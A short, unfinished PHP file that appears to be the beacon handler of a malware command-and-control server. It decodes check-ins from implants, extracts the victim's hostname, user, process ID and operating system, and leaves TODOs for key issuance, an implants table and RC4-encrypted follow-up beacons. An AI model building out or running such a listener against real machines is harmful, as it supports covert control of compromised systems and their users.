<?php
    include "connector.php";
    include "rc4.php";

    # Gets raw POST data
    $raw_post_data = file_get_contents("php://input");

    # If Base64 encoded POST data (initial beacon)
    if (base64_decode($raw_post_data, true) == true) {
        # Base64 decodes POST data
        $base64_decoded = base64_decode($raw_post_data);

        # Takes Base64 decoded POST data and splits based off "&"
        $ampersand_split = explode("&", $base64_decoded);

        # Parses and gets hostname
        $temp = explode("=", $ampersand_split[0]);
        $hostname = urldecode($temp[1]);

        # Parses and gets current user
        $temp = explode("=", $ampersand_split[1]);
        $current_user = urldecode($temp[1]);

        # Parses and gets process ID
        $temp = explode("=", $ampersand_split[2]);
        $process_id = urldecode($temp[1]);

        # Parses and gets operating system
        $temp = explode("=", $ampersand_split[3]);
        $operating_system = urldecode($temp[1]);

        # TO DO: Generate encryption key here
        # TO DO: Include "randomize.php" file and use that function to generate that encryption key
        echo "123456"; # DEBUGGING

        # TO DO: When we echo the encryption key, that will need to be Base64 encoded

        # TO DO: INSERT a new entry into the "implants" table (with newly-generated encryption key)
    }
    # Else RC4 encrypted POST data (recurring beacon)
    else {
        echo "rc4 data";
    }
?>
